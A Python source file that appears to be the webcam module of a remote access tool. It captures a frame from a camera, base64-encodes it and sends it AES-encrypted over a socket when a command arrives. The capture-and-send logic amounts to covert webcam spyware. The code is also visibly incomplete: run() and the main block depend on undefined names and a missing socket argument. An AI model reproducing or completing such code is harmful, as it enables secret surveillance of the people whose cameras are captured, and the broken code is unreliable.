import cv2
import base64

class WebCam:
    def __init__(self, sock) -> None:
        self.sock = sock
        self.record = False
        self.cameras = []

    def capture(self):
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return '0|Cannot not open carmera'
        else:
            ret, frame = cap.read()
            if ret:
                ret, buffer = cv2.imencode('.jpg', frame)
                img_bytes = buffer.tobytes()
                img_b64 = base64.b64encode(img_bytes).decode('utf-8')
                return '1|' + img_b64
            else:
                return '0|'

    def list_cam(self):
        index = 0
        device = []
        while True:
            cap = cv2.VideoCapture(index, cv2.CAP_DSHOW)
            if not cap.isOpened():
                break
            else:
                ret, frame = cap.read()
                if ret:
                    device.append(index)
                cap.release()
            index += 1

        self.cameras = device
        return device

    def run(self):
        cmd = para[0]
        payload = ''
        if cmd == 'start': # START WEBCAM
            pass
        elif cmd == 'stop': # STOP WEBCAM
            pass
        elif cmd == 'c': # CAPTURE
            payload = self.capture()
            payload = 'c|' + payload

        payload = 'WebCam|' + payload
        buffer = b64EnStr(payload)
        self.sock.send(_buffer(2, 0, AES(AES_key).encrypt_cbc(buffer.encode(), IV_value)))

if __name__ == '__main__':
    webcam = WebCam()